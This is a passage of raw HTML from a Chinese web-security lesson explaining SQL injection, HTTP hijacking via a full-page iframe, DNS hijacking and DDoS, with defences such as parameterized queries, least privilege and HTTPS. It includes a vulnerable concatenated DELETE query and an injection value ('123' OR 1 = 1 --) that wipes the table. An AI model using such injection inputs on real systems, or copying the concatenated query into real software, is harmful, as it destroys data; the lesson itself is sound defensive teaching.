data-first-offset="true"><span data-slate-string="true">比如有这样一条 SQL 的语句拼接：</span></span></span> 
</div> <div class="se-aa224933 se-ce87714d" data-slate-type="pre" data-slate-object="block" 
data-key="567" data-code-language="sql"> <div class="se-7d91f508 se-52aed401"> <span></span> 
</div> <div class="se-4fb9d717"> <div class="se-ab2540e8 se-4a574b7c" data-code-line-number="1"></div> 
</div> <div class="se-9cea6f0d ps ps--active-x"> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="568"> <span data-slate-object="text" data-key="569"><span 
data-slate-leaf="true" data-offset-key="569:0" data-first-offset="true"><span data-slate-string="true">String 
sql = "</span></span><span data-slate-leaf="true" data-offset-key="569:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_7250797505" data-annotation-type="annotation"><span 
data-slate-string="true">DELETE</span></span></span><span data-slate-leaf="true" data-offset-key="569:2"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="569:3"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_9382153829" 
data-annotation-type="annotation"><span data-slate-string="true">FROM</span></span></span><span 
data-slate-leaf="true" data-offset-key="569:4"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="569:5"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9836106592" data-annotation-type="annotation"><span data-slate-string="true">RECORDS</span></span></span><span 
data-slate-leaf="true" data-offset-key="569:6"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="569:7"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2294441266" data-annotation-type="annotation"><span data-slate-string="true">WHERE</span></span></span><span 
data-slate-leaf="true" data-offset-key="569:8"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="569:9"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_5006082377" data-annotation-type="annotation"><span data-slate-string="true">ID</span></span></span><span 
data-slate-leaf="true" data-offset-key="569:10"><span data-slate-string="true"> = </span></span><span 
data-slate-leaf="true" data-offset-key="569:11"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_3973371842" data-annotation-type="annotation"><span data-slate-string="true">" 
+ id + "</span></span></span><span data-slate-leaf="true" data-offset-key="569:12"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="569:13"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_6154467724" data-annotation-type="annotation"><span 
data-slate-string="true">AND</span></span></span><span data-slate-leaf="true" data-offset-key="569:14"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="569:15"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_4772399344" 
data-annotation-type="annotation"><span data-slate-string="true">STATUS</span></span></span><span 
data-slate-leaf="true" data-offset-key="569:16"><span data-slate-string="true"> = </span></span><span 
data-slate-leaf="true" data-offset-key="569:17"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_3265380358" data-annotation-type="annotation"><span data-slate-string="true">''done''</span></span></span><span 
data-slate-leaf="true" data-offset-key="569:18"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_5076309101" data-annotation-type="annotation"><span data-slate-string="true">"</span></span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 224px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-78489153 " data-slate-type="paragraph" data-slate-object="block" 
data-key="570"> <span data-slate-object="text" data-key="571"><span data-slate-leaf="true" 
data-offset-key="571:0" data-first-offset="true"><span data-slate-string="true">其中，这个 id 表示单条记录，且由用户的表单以字符串参数 
id 的方式提交上来。这条 SQL 的本意是要删除一条以 id 为主键的记录，并且只有其状态在已完成（Status 为 done）的时候才允许删除。</span></span></span> 
</div> <div class="se-62b91cd0 " data-slate-type="paragraph" data-slate-object="block" data-key="572"> 
<span data-slate-object="text" data-key="573"><span data-slate-leaf="true" data-offset-key="573:0" 
data-first-offset="true"><span data-slate-string="true">现在，攻击者在提交的时候精心构造了这样一个字符串参数 id：</span></span></span> 
</div> <div class="se-8d3cfd6f se-b4ea4eea" data-slate-type="pre" data-slate-object="block" 
data-key="574" data-code-language="javascript"> <div class="se-d39ab096 se-4fe5d930"> <span></span> 
</div> <div class="se-c9e050c9"> <div class="se-05814c36 se-3e80be67" data-code-line-number="1"></div> 
</div> <div class="se-7426c141 ps"> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="575"> <span data-slate-object="text" data-key="576"><span 
data-slate-leaf="true" data-offset-key="576:0" data-first-offset="true"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_4105406718" data-annotation-type="annotation"><span 
data-slate-string="true">"''123'' OR 1 = 1 --"</span></span></span></span> </div> <div class="ps__rail-x" 
style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 
0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 0px;"> <div class="ps__thumb-y" 
tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> </div> <div class="se-08c36579 
" data-slate-type="paragraph" data-slate-object="block" data-key="577"> <span data-slate-object="text" 
data-key="578"><span data-slate-leaf="true" data-offset-key="578:0" data-first-offset="true"><span 
data-slate-string="true">于是，这条 SQL 语句在拼接后就变成了：</span></span></span> </div> <div class="se-f99e3803 
se-91d76d57" data-slate-type="pre" data-slate-object="block" data-key="579" data-code-language="sql"> 
<div class="se-57a241d7 se-da3c7dd0"> <span></span> </div> <div class="se-94ac6b8e"> <div class="se-3b277ecc 
se-233432d6" data-code-line-number="1"></div> </div> <div class="se-c07bd340 ps ps--active-x"> 
<div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="580"> <span data-slate-object="text" data-key="581"><span data-slate-leaf="true" 
data-offset-key="581:0" data-first-offset="true"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9059591275" data-annotation-type="annotation"><span data-slate-string="true">DELETE</span></span></span><span 
data-slate-leaf="true" data-offset-key="581:1"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="581:2"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1599660102" data-annotation-type="annotation"><span data-slate-string="true">FROM</span></span></span><span 
data-slate-leaf="true" data-offset-key="581:3"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="581:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1833659344" data-annotation-type="annotation"><span data-slate-string="true">RECORDS</span></span></span><span 
data-slate-leaf="true" data-offset-key="581:5"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="581:6"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7960176596" data-annotation-type="annotation"><span data-slate-string="true">WHERE</span></span></span><span 
data-slate-leaf="true" data-offset-key="581:7"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="581:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1934341884" data-annotation-type="annotation"><span data-slate-string="true">ID</span></span></span><span 
data-slate-leaf="true" data-offset-key="581:9"><span data-slate-string="true"> = </span></span><span 
data-slate-leaf="true" data-offset-key="581:10"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_0798745988" data-annotation-type="annotation"><span data-slate-string="true">''123''</span></span></span><span 
data-slate-leaf="true" data-offset-key="581:11"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="581:12"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8709703697" data-annotation-type="annotation"><span data-slate-string="true">OR</span></span></span><span 
data-slate-leaf="true" data-offset-key="581:13"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="581:14"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_2746065308" data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span><span 
data-slate-leaf="true" data-offset-key="581:15"><span data-slate-string="true"> = </span></span><span 
data-slate-leaf="true" data-offset-key="581:16"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_9019024975" data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span><span 
data-slate-leaf="true" data-offset-key="581:17"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="581:18"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_8379699093" data-annotation-type="annotation"><span data-slate-string="true">-- 
AND STATUS = ''done''</span></span></span></span> </div> <div class="ps__rail-x" style="width: 
365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 
251px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 0px;"> <div class="ps__thumb-y" 
tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> </div> <div class="se-58f3ca67 
" data-slate-type="paragraph" data-slate-object="block" data-key="582"> <span data-slate-object="text" 
data-key="583"><span data-slate-leaf="true" data-offset-key="583:0" data-first-offset="true"><span 
data-slate-string="true">你看，虽然 WHERE 字句包含了对 ID 的判断，但是后面有一个恒真的“或”条件“1 = 1”，而且后面的 STATUS 判断被注释符号“–”给屏蔽掉了。于是，这条恐怖的删除所有记录的 
SQL 就被执行了。</span></span></span> </div> <div class="se-a668caca " data-slate-type="paragraph" 
data-slate-object="block" data-key="584"> <span data-slate-object="text" data-key="585"><span 
data-slate-leaf="true" data-offset-key="585:0" data-first-offset="true"><span data-slate-string="true">现在你可以想象一下 
SQL 注入的影响到底有多么严重了。在本章我已经提到过，程序的问题还好修复或回滚，但是数据造成的损失往往很难修复。</span></span></span> </div> <div 
class="se-f3b33f39 " data-slate-type="paragraph" data-slate-object="block" data-key="586"> 
<span data-slate-object="text" data-key="587"><span data-slate-leaf="true" data-offset-key="587:0" 
data-first-offset="true"><span data-slate-string="true">知道了原理，那么我们就可以采取相应的措施来应对了：</span></span></span> 
</div> <div class="se-953b1118" data-slate-type="list" data-slate-object="block" data-key="588"> 
<div class="se-83f5c6a2 se-fdc63858" data-slate-type="list-line" data-slate-object="block" 
data-key="589"> <span data-slate-object="text" data-key="590"><span data-slate-leaf="true" 
data-offset-key="590:0" data-first-offset="true"><span data-slate-string="true">第一种，对于参数进行转义和过滤，这和我们前面介绍的 
XSS 的应对是一样的。如果参数的格式明确，我们应当较为严格地校验参数，比如上面的例子，如果 id 实际是一个数值，那么用户输入非数值就应当报错。</span></span></span> 
</div> <div class="se-93a59a77 se-f4008240" data-slate-type="list-line" data-slate-object="block" 
data-key="591"> <span data-slate-object="text" data-key="592"><span data-slate-leaf="true" 
data-offset-key="592:0" data-first-offset="true"><span data-slate-string="true">第二种，SQL 的语句执行尽可能采用参数化查询的接口，而不是单纯地当做字符串来拼接。当然，一般在使用持久化框架的时候，这样的事情框架一般都替程序员考虑到了。</span></span></span> 
</div> <div class="se-77beadcf se-5f73fb21" data-slate-type="list-line" data-slate-object="block" 
data-key="593"> <span data-slate-object="text" data-key="594"><span data-slate-leaf="true" 
data-offset-key="594:0" data-first-offset="true"><span data-slate-string="true">第三种，严格的权限控制，这和 
Linux 下面权限控制的原则是一样的，保持“最小授权”原则，即尽可能只授予能实现功能的最小权限。</span></span></span> </div> </div> <h3 class="se-5ce346d7" 
data-slate-type="heading" data-slate-object="block" data-key="595"><span data-slate-object="text" 
data-key="596"><span data-slate-leaf="true" data-offset-key="596:0" data-first-offset="true"><span 
data-slate-string="true">4. HTTP 劫持</span></span></span></h3> <div class="se-941cd70e " data-slate-type="paragraph" 
data-slate-object="block" data-key="597"> <span data-slate-object="text" data-key="598"><span 
data-slate-leaf="true" data-offset-key="598:0" data-first-offset="true"><span data-slate-string="true">HTTP 
劫持的原理很简单，但是却非常常见。就是说，由于 HTTP 协议是明文通信的，它就可以被任意篡改。而干这事儿干得最多的，不是什么传统意义上的“黑客”，而是那些无良的网络服务提供商和运营商们，他们利用对网络控制之便利，通过这种方式强行给用户塞广告。</span></span></span> 
</div> <div class="se-9594edaf " data-slate-type="paragraph" data-slate-object="block" data-key="599"> 
<span data-slate-object="text" data-key="600"><span data-slate-leaf="true" data-offset-key="600:0" 
data-first-offset="true"><span data-slate-string="true">我有一个个人的博客网站，有一次有读者跟我说：“你为什么投放垃圾广告？”一开始我还很纳闷，我可从来没有干过这事儿啊，怎么会有广告，后来才知道，其实，这就是因为遭遇了无良运营商的 
HTTP 劫持。下面的这个截屏（来自</span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="601" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" data-key="602"><span 
data-slate-leaf="true" data-offset-key="602:0" data-first-offset="true"><span data-slate-string="true">这篇</span></span></span></a><span 
data-slate-object="text" data-key="603"><span data-slate-leaf="true" data-offset-key="603:0" 
data-first-offset="true"><span data-slate-string="true">文章），右下角的广告就是通过 HTTP 劫持干的。</span></span></span> 
</div> <div class="se-47c4a3fa" data-slate-type="image" data-slate-object="block" data-key="604"> 
<img class="se-0a0a1dd9" src="https://static001.geekbang.org/resource/image/68/ad/688d25f375621722af79cb7330427fad.jpg"> 
</div> <div class="se-2d736859 " data-slate-type="paragraph" data-slate-object="block" data-key="605"> 
<span data-slate-object="text" data-key="606"><span data-slate-leaf="true" data-offset-key="606:0" 
data-first-offset="true"><span data-slate-string="true">虽然可以任意修改 HTTP 响应报文，但是修改就可能带来对原页面的影响。于是，攻击者为了对用户造成的影响尽量小，而达到“单纯”地投放广告的目的，很可能会使用 
iFrame。它利用了 iFrame 和母页面相对独立的特性，比方说：</span></span></span> </div> <div class="se-4374f6ec se-51b8b1da" 
data-slate-type="pre" data-slate-object="block" data-key="607" data-code-language="javascript"> 
<div class="se-8f624c01 se-3312fe41"> <span></span> </div> <div class="se-70710cbf"> <div class="se-af6076f9 
se-260f710c" data-code-line-number="1"></div> </div> <div class="se-6cda8af3 ps ps--active-x"> 
<div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="608"> <span data-slate-object="text" data-key="609"><span data-slate-leaf="true" 
data-offset-key="609:0" data-first-offset="true"><span data-slate-string="true">&lt;iframe 
id=</span></span><span data-slate-leaf="true" data-offset-key="609:1"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_7154364292" data-annotation-type="annotation"><span 
data-slate-string="true">"fulliframe"</span></span></span><span data-slate-leaf="true" data-offset-key="609:2"><span 
data-slate-string="true"> name=</span></span><span data-slate-leaf="true" data-offset-key="609:3"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_1569536632" 
data-annotation-type="annotation"><span data-slate-string="true">"fulliframe"</span></span></span><span 
data-slate-leaf="true" data-offset-key="609:4"><span data-slate-string="true"> frameSpacing=</span></span><span 
data-slate-leaf="true" data-offset-key="609:5"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_6783682986" data-annotation-type="annotation"><span data-slate-string="true">0</span></span></span><span 
data-slate-leaf="true" data-offset-key="609:6"><span data-slate-string="true"> noResize height=</span></span><span 
data-slate-leaf="true" data-offset-key="609:7"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_4645117147" data-annotation-type="annotation"><span data-slate-string="true">1350</span></span></span><span 
data-slate-leaf="true" data-offset-key="609:8"><span data-slate-string="true"> marginHeight=</span></span><span 
data-slate-leaf="true" data-offset-key="609:9"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_2979435315" data-annotation-type="annotation"><span data-slate-string="true">0</span></span></span><span 
data-slate-leaf="true" data-offset-key="609:10"><span data-slate-string="true"> border=</span></span><span 
data-slate-leaf="true" data-offset-key="609:11"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_6698522667" data-annotation-type="annotation"><span data-slate-string="true">0</span></span></span><span 
data-slate-leaf="true" data-offset-key="609:12"><span data-slate-string="true"> src=</span></span><span 
data-slate-leaf="true" data-offset-key="609:13"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_6284208591" data-annotation-type="annotation"><span data-slate-string="true">" 
原网页 "</span></span></span><span data-slate-leaf="true" data-offset-key="609:14"><span data-slate-string="true"> 
frameBorder=</span></span><span data-slate-leaf="true" data-offset-key="609:15"><span class=" 
gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_0399035136" data-annotation-type="annotation"><span 
data-slate-string="true">0</span></span></span><span data-slate-leaf="true" data-offset-key="609:16"><span 
data-slate-string="true"> width=</span></span><span data-slate-leaf="true" data-offset-key="609:17"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_3923996631" 
data-annotation-type="annotation"><span data-slate-string="true">"100%"</span></span></span><span 
data-slate-leaf="true" data-offset-key="609:18"><span data-slate-string="true"> scrolling=no 
vspale=</span></span><span data-slate-leaf="true" data-offset-key="609:19"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_1717572126" data-annotation-type="annotation"><span 
data-slate-string="true">"0"</span></span></span><span data-slate-leaf="true" data-offset-key="609:20"><span 
data-slate-string="true">&gt;&lt;/iframe&gt;</span></span></span> </div> <div class="ps__rail-x" 
style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" style="left: 
0px; width: 97px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 0px;"> <div 
class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> </div> 
<div class="se-4e8418d7 " data-slate-type="paragraph" data-slate-object="block" data-key="610"> 
<span data-slate-object="text" data-key="611"><span data-slate-leaf="true" data-offset-key="611:0" 
data-first-offset="true"><span data-slate-string="true">你看，原网页被装到了一个 iFrame 里面去，并且这个 iFrame 
没有边，大小占据了整个浏览器，因此用户很可能不知情，但是，整个页面实际已经被替换掉了，那么也就可以在这个 iFrame 以外添加浮动广告了。</span></span></span> 
</div> <div class="se-13aa6594 " data-slate-type="paragraph" data-slate-object="block" data-key="612"> 
<span data-slate-object="text" data-key="613"><span data-slate-leaf="true" data-offset-key="613:0" 
data-first-offset="true"><span data-slate-string="true">对于 HTTP 劫持，由于攻击者利用了 HTTP 明文传输的特性，因此解决方案很简单，就是将网站切换为 
HTTPS。至于其它的方法，相对都比较特例化，并不一般和通用，只有将传输加密才是最理想的解决方案。</span></span></span> </div> <h3 class="se-f51227c6" 
data-slate-type="heading" data-slate-object="block" data-key="614"><span data-slate-object="text" 
data-key="615"><span data-slate-leaf="true" data-offset-key="615:0" data-first-offset="true"><span 
data-slate-string="true">5. DNS 劫持</span></span></span></h3> <div class="se-092ab303 " data-slate-type="paragraph" 
data-slate-object="block" data-key="616"> <span data-slate-object="text" data-key="617"><span 
data-slate-leaf="true" data-offset-key="617:0" data-first-offset="true"><span data-slate-string="true">DNS 
劫持的原理也很简单（你如果忘记了 DNS 的工作机制，可以回看 </span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="618" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" data-key="619"><span 
data-slate-leaf="true" data-offset-key="619:0" data-first-offset="true"><span data-slate-string="true">[第 
29 讲]</span></span></span></a><span data-slate-object="text" data-key="620"><span data-slate-leaf="true" 
data-offset-key="620:0" data-first-offset="true"><span data-slate-string="true">），用户的浏览器在通过 
DNS 查询目标域名对应的 IP 地址的时候，会被攻击者引导到一个恶意网站的地址。这个假的网站也可以有相似的页面布局，也可能有“正规”方式申请的 HTTPS 证书，换言之，</span></span></span><span 
data-slate-object="text" data-key="621"><span data-slate-leaf="true" data-offset-key="621:0" 
data-first-offset="true"><span class="se-7b3eb8a9" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">HTTPS 加密通信并不能防范 DNS 劫持</span></span></span></span><span data-slate-object="text" 
data-key="622"><span data-slate-leaf="true" data-offset-key="622:0" data-first-offset="true"><span 
data-slate-string="true">，因此用户很可能被欺骗而不察觉。</span></span></span> </div> <div class="se-7c262754 
" data-slate-type="paragraph" data-slate-object="block" data-key="623"> <span data-slate-object="text" 
data-key="624"><span data-slate-leaf="true" data-offset-key="624:0" data-first-offset="true"><span 
data-slate-string="true">如果你还不是很理解，那让我再来进一步解释。当浏览器敲入域名地址并回车，用户在网上冲浪的整个过程，一环套一环，只要有任何一环存在安全隐患，那么其它环节的安全工作做得再好也是没有用的。DNS 
假如被劫持了，浏览器都去和一个假冒的网站通信了，HTTPS 加密做的也只是保证你和这个假冒网站通信的完整性、保密性，那还有何用？</span></span></span><span 
data-slate-object="text" data-key="625"><span data-slate-leaf="true" data-offset-key="625:0" 
data-first-offset="true"><span class="se-07ced9ed" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">就好比要去药店买药，可去了家假的药店，那么保证整个交易过程的安全性就失去了它原本的意义了。</span></span></span></span> 
</div> <div class="se-3c40cead " data-slate-type="paragraph" data-slate-object="block" data-key="626"> 
<span data-slate-object="text" data-key="627"><span data-slate-leaf="true" data-offset-key="627:0" 
data-first-offset="true"><span data-slate-string="true">对于真正开发维护 Web 网站或应用的程序员来说，DNS 劫持相对来说比较难以防范，因为 
DNS 解析的步骤，从整个过程来看，请求根本还没有到达实际的应用，确实有些无能为力。</span></span></span> </div> <div class="se-b9745b8d 
" data-slate-type="paragraph" data-slate-object="block" data-key="628"> <span data-slate-object="text" 
data-key="629"><span data-slate-leaf="true" data-offset-key="629:0" data-first-offset="true"><span 
data-slate-string="true">事实上，</span></span></span><span data-slate-object="text" data-key="630"><span 
data-slate-leaf="true" data-offset-key="630:0" data-first-offset="true"><span class="se-5ff40681" 
data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">安全防范的各个环节就像一个木桶的各个木板，网络公共服务的安全性，经常决定了用户网上冲浪安全性的上限。</span></span></span></span><span 
data-slate-object="text" data-key="631"><span data-slate-leaf="true" data-offset-key="631:0" 
data-first-offset="true"><span data-slate-string="true">2010 年的</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="632" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" 
data-key="633"><span data-slate-leaf="true" data-offset-key="633:0" data-first-offset="true"><span 
data-slate-string="true">百度被黑事件</span></span></span></a><span data-slate-object="text" data-key="634"><span 
data-slate-leaf="true" data-offset-key="634:0" data-first-offset="true"><span data-slate-string="true">，就是遭遇了 
DNS 劫持。由于 DNS 解析的过程比较长，劫持可能发生在网络，也可以发生在本机（别忘了本机有 hosts 文件），还可能发生在某一个子网的路由。对于 DNS 网络明文通信带来的隐患，有一个安全的域名解析方案，叫做 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="635" class="se-d795ea91 
se-eb2c7cbb"><span data-slate-object="text" data-key="636"><span data-slate-leaf="true" data-offset-key="636:0" 
data-first-offset="true"><span data-slate-string="true">DNS over HTTPS</span></span></span></a><span 
data-slate-object="text" data-key="637"><span data-slate-leaf="true" data-offset-key="637:0" 
data-first-offset="true"><span data-slate-string="true">，目前还在实验阶段，仅有部分 DNS 服务支持。</span></span></span> 
</div> <h3 class="se-8d42b5bf" data-slate-type="heading" data-slate-object="block" data-key="638"><span 
data-slate-object="text" data-key="639"><span data-slate-leaf="true" data-offset-key="639:0" 
data-first-offset="true"><span data-slate-string="true">6. DDoS 攻击</span></span></span></h3> 
<div class="se-efd8b01d " data-slate-type="paragraph" data-slate-object="block" data-key="640"> 
<span data-slate-object="text" data-key="641"><span data-slate-leaf="true" data-offset-key="641:0" 
data-first-offset="true"><span data-slate-string="true">最后我来简单介绍一下 DDoS，Distributed Denial-of-Service，分布式拒绝服务，这种攻击方式从理论上说，最难以防范，被称为互联网的“癌症”。</span></span></span> 
</div> <div class="se-bf0f0f27 " data-slate-type="paragraph" data-slate-object="block" data-key="642"> 
<span data-slate-object="text" data-key="643"><span data-slate-leaf="true" data-offset-key="643:0" 
data-first-offset="true"><span data-slate-string="true">为什么呢？因为它的原理是，攻击者使用若干被“攻陷”的电脑（比如被病毒占领和控制的“肉鸡”），向网络应用和服务同一时间发起请求，通过一瞬间的请求洪峰，将服务冲垮。</span></span></span> 
</div> <div class="se-40d5fe63 " data-slate-type="paragraph" data-slate-object="block" data-key="644"> 
<span data-slate-object="text" data-key="645"><span data-slate-leaf="true" data-offset-key="645:0" 
data-first-offset="true"><span class="se-871bb3ec" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">DDoS 攻击的目的不是偷窃用户数据，也不是为了仿冒用户身份，而是“无差别”阻塞网络，引发“拒绝服务”，让正常使用网站和应用的用户难以继续使用，这个“无差别”最要命，简单、粗暴，但却有效。</span></span></span></span> 
</div> <div class="se-cc8f1529 " data-slate-type="paragraph" data-slate-object="block" data-key="646"> 
<span data-slate-object="text" data-key="647"><span data-slate-leaf="true" data-offset-key="647:0" 
data-first-offset="true"><span data-slate-string="true">因此对于 DDoS 的攻击，我们需要整个网络链路配合，包括路由器、交换机、防火墙等等组件，采取入侵检测和流量过滤等多种方式来联合防范。这部分的内容涉及比较多，我在扩展阅读放了一点材料，感兴趣的话可以阅读。</span></span></span> 
</div> <h2 class="se-03bd29bc" data-slate-type="heading" data-slate-object="block" data-key="648"><span 
data-slate-object="text" data-key="649"><span data-slate-leaf="true" data-offset-key="649:0" 
data-first-offset="true"><span data-slate-string="true">总结思考</span></span></span></h2> <div 
class="se-6499499a " data-slate-type="paragraph" data-slate-object="block" data-key="650"> 
<span data-slate-object="text" data-key="651"><span data-slate-leaf="true" data-offset-key="651:0" 
data-first-offset="true"><span data-slate-string="true">今天我们重点学习了常见的几种 Web 攻击方式，希望你从中学到了一些网站安全问题的知识和相应的应对办法，毕竟，安全无小事。</span></span></span> 
</div> <div class="se-db336e89 " data-slate-type="paragraph" data-slate-object="block" data-key="652"> 
<span data-slate-object="text" data-key="653"><span data-slate-leaf="true" data-offset-key="653:0" 
data-first-offset="true"><span data-slate-string="true">下面来提两个问题吧：</span></span></span> </div> 
<div class="se-c5612eb7" data-slate-type="list" data-slate-object="block" data-key="654"> <div 
class="se-c24f4fa2 se-b8b3d28c" data-slate-type="list-line" data-slate-object="block" data-key="655"> 
<span data-slate-object="text" data-key="656"><span data-slate-leaf="true" data-offset-key="656:0" 
data-first-offset="true"><span data-slate-string="true">手动输入验证码的功能如今已经被广泛使用了，你觉得对于今天介绍的攻击方式，验证码可以用来防范它们中的哪一些？</span></span></span> 
</div> <div class="se-39c645e6 se-2fc746f2" data-slate-type="list-line" data-slate-object="block" 
data-key="657"> <span data-slate-object="text" data-key="658"><span data-slate-leaf="true" 
data-offset-key="658:0" data-first-offset="true"><span data-slate-string="true">假如你需要设计一个电商的网上支付功能，用于在线购买商品，用户需要填写信用卡信息并提交。对于这个过程，从安全的角度看，你觉得有哪些措施是必须要采取，从而提高支付行为整体的安全性的？</span></span></span> 
</div> </div> <h2 class="se-c4f91389" data-slate-type="heading" data-slate-object="block" data-key="659"><span 
data-slate-object="text" data-key="660"><span data-slate-leaf="true" data-offset-key="660:0" 
data-first-offset="true"><span data-slate-string="true">扩展阅读</span></span></span></h2> <div 
class="se-296f9318" data-slate-type="list" data-slate-object="block" data-key="661"> <div class="se-0dba25b9 
se-7e52ed7f" data-slate-type="list-line" data-slate-object="block" data-key="662"> <span data-slate-object="text" 
data-key="663"><span data-slate-leaf="true" data-offset-key="663:0" data-first-offset="true"><span 
data-slate-string="true">文中提到了 HttpOnly 标识，想了解更多细节你可以阅读</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="664" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" 
data-key="665"><span data-slate-leaf="true" data-offset-key="665:0" data-first-offset="true"><span 
data-slate-string="true">这篇文章</span></span></span></a><span data-slate-object="text" data-key="666"><span 
data-slate-leaf="true" data-offset-key="666:0" data-first-offset="true"><span data-slate-string="true">。</span></span></span> 
</div> <div class="se-0eedfe3c se-aae0b980" data-slate-type="list-line" data-slate-object="block" 
data-key="667"> <span data-slate-object="text" data-key="668"><span data-slate-leaf="true" 
data-offset-key="668:0" data-first-offset="true"><span data-slate-string="true">文中提到了 HTTP 
的 Referer 头，你可以参阅</span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="669" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" data-key="670"><span 
data-slate-leaf="true" data-offset-key="670:0" data-first-offset="true"><span data-slate-string="true">维基百科</span></span></span></a><span 
data-slate-object="text" data-key="671"><span data-slate-leaf="true" data-offset-key="671:0" 
data-first-offset="true"><span data-slate-string="true">获得更详细的介绍。</span></span></span> </div> 
<div class="se-5dbff023 se-46f42aaf" data-slate-type="list-line" data-slate-object="block" 
data-key="672"> <span data-slate-object="text" data-key="673"><span data-slate-leaf="true" 
data-offset-key="673:0" data-first-offset="true"><span data-slate-string="true">文中提到了 SQL 的参数化查询，如果不了解，可以阅读这篇</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="674" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="675"><span data-slate-leaf="true" data-offset-key="675:0" 
data-first-offset="true"><span data-slate-string="true">介绍</span></span></span></a><span data-slate-object="text" 
data-key="676"><span data-slate-leaf="true" data-offset-key="676:0" data-first-offset="true"><span 
data-slate-string="true">。</span></span></span> </div> <div class="se-0c1d14d7 se-aad9e9a8" 
data-slate-type="list-line" data-slate-object="block" data-key="677"> <span data-slate-object="text" 
